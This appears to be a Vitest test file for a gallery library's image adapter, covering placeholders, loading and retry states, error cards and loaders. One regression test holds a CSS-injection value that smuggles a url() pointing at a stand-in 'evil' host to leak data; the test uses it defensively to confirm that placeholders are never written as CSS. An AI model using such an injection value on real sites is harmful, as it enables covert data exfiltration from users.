// @vitest-environment happy-dom

import type { AdapterCtx, Item } from '@gallerist/core'
import { describe, expect, it } from 'vitest'
import { DEFAULT_STRINGS } from '../strings'
import { imageAdapter } from './image'

const ctx = (over: Partial<AdapterCtx> = {}): AdapterCtx => ({
  signal: new AbortController().signal,
  priority: 'auto',
  ...over,
})
const img = (over: Partial<Item> = {}): Item => ({
  id: 'i',
  type: 'image',
  source: 'photo.jpg',
  ...over,
})
const slot = () => document.createElement('div')

describe('imageAdapter', () => {
  it('declares type image and supports zoom', () => {
    const a = imageAdapter()
    expect(a.type).toBe('image')
    const m = a.mount(img(), slot(), ctx())
    expect(m.supportsZoom).toBe(true)
  })

  it('mounts an <img> with decoding=async and the resolved src', () => {
    const s = slot()
    const m = imageAdapter().mount(img({ source: 'photo.jpg' }), s, ctx())
    const el = m.element as HTMLImageElement
    expect(el.tagName).toBe('IMG')
    expect(el.getAttribute('decoding')).toBe('async')
    expect(el.src).toContain('photo.jpg')
    expect(s.contains(el)).toBe(true)
  })

  it('applies srcset and sizes for a responsive source', () => {
    const m = imageAdapter().mount(
      img({ source: { src: 'a.jpg', srcset: 'a.jpg 1x, a@2x.jpg 2x', sizes: '50vw' } }),
      slot(),
      ctx(),
    )
    const el = m.element as HTMLImageElement
    expect(el.getAttribute('srcset')).toContain('a@2x.jpg 2x')
    expect(el.getAttribute('sizes')).toBe('50vw')
  })

  it('sets fetchpriority from the ctx', () => {
    const m = imageAdapter().mount(img(), slot(), ctx({ priority: 'high' }))
    expect(m.element.getAttribute('fetchpriority')).toBe('high')
  })

  it('paints a colour placeholder as a flat fill in the image box, at once', () => {
    const s = slot()
    imageAdapter().mount(img({ placeholder: 'rgb(1 2 3 / 50%)' }), s, ctx())
    const box = s.querySelector<HTMLElement>('.gallerist-media-placeholder')
    expect(box?.style.backgroundColor).toBeTruthy()
    expect(box?.hasAttribute('data-gallerist-skeleton')).toBe(false)
    expect(box?.querySelector('img, .gallerist-media-pill')).toBeNull() // no pill for a colour
    // under the image, so the image fades in over it
    expect(box?.nextElementSibling).toBe(s.querySelector('.gallerist-media-image'))
  })

  it('shows an image placeholder in its own layer, with a pill, in the box of the naturalSize', () => {
    const s = slot()
    const m = imageAdapter().mount(
      img({ placeholder: 'data:image/png;base64,AAAA', naturalSize: { w: 1600, h: 900 } }),
      s,
      ctx(),
    )
    const box = s.querySelector<HTMLElement>('.gallerist-media-placeholder')
    expect(box?.style.getPropertyValue('--gallerist-media-ratio')).toBe('1600 / 900')
    expect(box?.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,AAAA')
    expect(box?.querySelector('img')?.alt).toBe('') // decorative: the image's alt names it
    expect(m.element.style.backgroundImage).toBe('') // nothing painted on the hidden <img>
    const status = box?.querySelector('.gallerist-media-pill [role="status"]')
    expect(status?.textContent).toBe('Loading full size…')
    expect(box?.querySelector('button')).toBeNull()
  })

  it('takes the ratio from the placeholder image when the item has no naturalSize', () => {
    const s = slot()
    imageAdapter().mount(img({ placeholder: 'thumbs/a.jpg' }), s, ctx())
    const pv = s.querySelector<HTMLImageElement>('.gallerist-media-placeholder img')
    expect(pv).not.toBeNull()
    if (!pv) return
    Object.defineProperty(pv, 'naturalWidth', { value: 320 })
    Object.defineProperty(pv, 'naturalHeight', { value: 180 })
    pv.dispatchEvent(new Event('load'))
    const box = s.querySelector<HTMLElement>('.gallerist-media-placeholder')
    expect(box?.style.getPropertyValue('--gallerist-media-ratio')).toBe('320 / 180')
  })

  it('shows a skeleton box with no placeholder', () => {
    const s = slot()
    imageAdapter().mount(img(), s, ctx())
    const box = s.querySelector('.gallerist-media-placeholder')
    expect(box?.hasAttribute('data-gallerist-skeleton')).toBe(true)
    expect(box?.children.length).toBe(0)
  })

  it('hides the placeholder and drops the pill once the image has loaded', async () => {
    const s = slot()
    const m = imageAdapter().mount(img({ placeholder: 'a-thumb.jpg' }), s, ctx())
    m.element.dispatchEvent(new Event('load'))
    await m.ready
    const box = s.querySelector('.gallerist-media-placeholder')
    expect(box?.hasAttribute('data-gallerist-loaded')).toBe(true)
    expect(s.querySelector('.gallerist-media-pill')).toBeNull()
    m.destroy()
    expect(s.children.length).toBe(0)
  })

  it('keeps an image placeholder on a failure, and the pill offers Retry (no error card)', async () => {
    const s = slot()
    let retried = 0
    const m = imageAdapter().mount(
      img({ placeholder: 'a-thumb.jpg', alt: 'Chart' }),
      s,
      ctx({ retry: () => retried++ } as Partial<AdapterCtx>),
    )
    const status = s.querySelector('.gallerist-media-pill [role="status"]')
    m.element.dispatchEvent(new Event('error'))
    await expect(m.ready).rejects.toThrow()
    expect(s.querySelector('.gallerist-media-error')).toBeNull()
    const box = s.querySelector('.gallerist-media-placeholder')
    expect(box?.hasAttribute('data-gallerist-error')).toBe(true)
    // the same live region says it (a new one might not be announced)
    expect(s.querySelector('.gallerist-media-pill [role="status"]')).toBe(status)
    expect(status?.textContent).toBe('Couldn’t load full size')
    const retry = s.querySelector<HTMLButtonElement>('.gallerist-media-pill button')
    expect(retry?.type).toBe('button')
    expect(retry?.textContent).toBe('Retry')
    retry?.click()
    expect(retried).toBe(1)
  })

  it('takes the pill text from the renderer strings, and shows no Retry without a retry', async () => {
    const s = slot()
    const strings = {
      ...DEFAULT_STRINGS,
      loadingFull: 'Chargement…',
      loadFailed: 'Échec',
      retry: 'Réessayer',
    }
    const m = imageAdapter().mount(
      img({ placeholder: 'a-thumb.jpg' }),
      s,
      ctx({ strings } as Partial<AdapterCtx>),
    )
    const status = s.querySelector('.gallerist-media-pill [role="status"]')
    expect(status?.textContent).toBe('Chargement…')
    m.element.dispatchEvent(new Event('error'))
    await expect(m.ready).rejects.toThrow()
    expect(status?.textContent).toBe('Échec')
    expect(s.querySelector('.gallerist-media-pill button')).toBeNull()
  })

  it('shows the error card on a failure with a colour placeholder, without the box', async () => {
    const s = slot()
    const m = imageAdapter().mount(img({ placeholder: '#123456' }), s, ctx())
    m.element.dispatchEvent(new Event('error'))
    await expect(m.ready).rejects.toThrow()
    expect(s.querySelector('.gallerist-media-error')).not.toBeNull()
    expect(s.querySelector('.gallerist-media-placeholder')).toBeNull()
  })

  it('never paints a placeholder through CSS (no url() to break out of)', () => {
    // an embedded quote once could inject a second url() → attacker-controlled request; the
    // placeholder is now an <img> src, never CSS text
    const s = slot()
    const m = imageAdapter().mount(img({ placeholder: 'x"), url("//evil/leak?c=' }), s, ctx())
    expect(m.element.style.backgroundImage).toBe('')
    const box = s.querySelector<HTMLElement>('.gallerist-media-placeholder')
    expect(box?.style.backgroundImage).toBe('')
    expect(box?.querySelector('img')?.getAttribute('src')).toBe('x"), url("//evil/leak?c=')
  })

  it('returns the naturalSize hint without a load', () => {
    const m = imageAdapter().mount(img({ naturalSize: { w: 800, h: 600 } }), slot(), ctx())
    expect(m.naturalSize?.()).toEqual({ w: 800, h: 600 })
  })

  it('resolves ready and flags loaded on the load event', async () => {
    const m = imageAdapter().mount(img(), slot(), ctx())
    m.element.dispatchEvent(new Event('load'))
    await expect(m.ready).resolves.toBeUndefined()
    expect(m.element.hasAttribute('data-gallerist-loaded')).toBe(true)
  })

  it('shows a centered error card with the alt caption on a failed load (I-UX3)', async () => {
    const s = slot()
    const m = imageAdapter().mount(img({ alt: 'Broken chart' }), s, ctx())
    m.element.dispatchEvent(new Event('error'))
    await expect(m.ready).rejects.toThrow()
    expect(m.element.hasAttribute('data-gallerist-error')).toBe(true)
    const card = s.querySelector('.gallerist-media-error')
    expect(card).not.toBeNull()
    expect(card?.getAttribute('role')).toBe('img')
    expect(card?.querySelector('.gallerist-media-error-label')?.textContent).toBe('Broken chart')
    m.destroy()
    expect(s.querySelector('.gallerist-media-error')).toBeNull() // card removed on teardown
  })

  it('renders the error card without a label when the item has no alt (I-UX3)', async () => {
    const s = slot()
    const m = imageAdapter().mount(img(), s, ctx())
    m.element.dispatchEvent(new Event('error'))
    await expect(m.ready).rejects.toThrow()
    expect(s.querySelector('.gallerist-media-error')).not.toBeNull()
    expect(s.querySelector('.gallerist-media-error-label')).toBeNull()
  })

  it('rejects ready when the signal is already aborted', async () => {
    const c = new AbortController()
    c.abort()
    const m = imageAdapter().mount(img(), slot(), ctx({ signal: c.signal }))
    await expect(m.ready).rejects.toThrow()
  })

  it('destroy removes the element from the DOM', () => {
    const s = slot()
    const m = imageAdapter().mount(img(), s, ctx())
    m.destroy()
    expect(s.contains(m.element)).toBe(false)
  })

  it('resolves a loader that returns a URL string', async () => {
    const m = imageAdapter().mount(
      img({ source: { loader: async () => 'loaded.jpg' } }),
      slot(),
      ctx(),
    )
    await new Promise((r) => setTimeout(r, 0)) // flush the loader
    m.element.dispatchEvent(new Event('load'))
    await expect(m.ready).resolves.toBeUndefined()
    expect((m.element as HTMLImageElement).src).toContain('loaded.jpg')
  })

  it('rejects ready when the loader rejects (no unhandled rejection)', async () => {
    const m = imageAdapter().mount(
      img({ source: { loader: async () => Promise.reject(new Error('boom')) } }),
      slot(),
      ctx(),
    )
    await expect(m.ready).rejects.toThrow('boom')
  })

  it('mounts a custom element returned by the loader and resolves ready', async () => {
    const custom = document.createElement('div')
    custom.id = 'custom-media'
    const s = slot()
    const m = imageAdapter().mount(img({ source: { loader: async () => custom } }), s, ctx())
    await expect(m.ready).resolves.toBeUndefined()
    expect(s.contains(custom)).toBe(true)
    expect(custom.hasAttribute('data-gallerist-loaded')).toBe(true)
    expect(m.element).toBe(custom)
  })
})
